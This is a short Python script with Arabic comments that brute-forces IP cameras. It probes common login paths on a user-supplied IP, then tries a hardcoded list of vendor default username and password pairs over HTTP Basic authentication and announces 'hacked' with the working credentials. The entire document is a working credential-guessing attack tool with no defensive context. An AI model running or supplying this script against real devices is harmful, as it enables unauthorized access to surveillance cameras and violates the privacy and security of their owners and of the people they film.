import requests
from requests.auth import HTTPBasicAuth
import sys

# قائمة شاملة لليوزرات والباسوردات الافتراضية لأشهر الأنظمة (Hikvision, Dahua, Axis, Sony, إلخ)
DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "12345"), ("admin", "123456"), 
    ("admin", "password"), ("admin", "12345abc"), ("admin", "admin123"),
    ("root", "pass"), ("root", "root"), ("root", "1234"),
    ("admin", "888888"), ("admin", "666666"), ("support", "support"),
    ("admin", "7ujMko0admin"), ("admin", "system"), ("admin", "meinsm")
]

# المسارات الشائعة لوجهات برمجة الكاميرات (Endpoints)
COMMON_PATHS = [
    "/index.asp", "/doc/page/login.asp", "/login.php", 
    "/cgi-bin/configManager.cgi", "/home.html", "/main.preview"
]

def test_camera_access(target_ip):
    print(f"[*] تفعيل وحدة الوصول المتقدمة للهدف: {target_ip}")
    print("-" * 60)

    # محاولة إيجاد المسار الصحيح أولاً
    valid_url = f"http://{target_ip}/"
    for path in COMMON_PATHS:
        try:
            test_url = f"http://{target_ip}{path}"
            response = requests.get(test_url, timeout=2)
            if response.status_code in [200, 401]:
                valid_url = test_url
                print(f"[+] تم تحديد مسار لوحة التحكم: {path}")
                break
        except:
            continue

    # بدء عملية Brute Force
    for user, password in DEFAULT_CREDS:
        try:
            # استخدام HTTPBasicAuth و HTTPDigestAuth (بعض الكاميرات تطلب Digest)
            response = requests.get(valid_url, auth=HTTPBasicAuth(user, password), timeout=3)
            
            if response.status_code == 200:
                print(f"\n[SUCCESS] تم الاختراق!")
                print(f"Target: {target_ip}")
                print(f"User  : {user}")
                print(f"Pass  : {password}")
                print(f"URL   : {valid_url}")
                return True
            
            print(f"[-] محاولة فاشلة: {user}:{password}", end="\r")
            
        except requests.exceptions.RequestException:
            print(f"\n[ERROR] انقطع الاتصال بـ {target_ip}")
            return False
                
    print("\n" + "-" * 60)
    print("[!] انتهى الفحص: لم يتم العثور على ثغرة في كلمة المرور.")
    return False

if __name__ == "__main__":
    # التحقق من إدخال الآي بي من قبل المستخدم
    target = input("أدخل IP الكاميرا المراد فحصها: ")
    if target:
        test_camera_access(target)
    else:
        print("خطأ: يجب إدخال عنوان IP.")
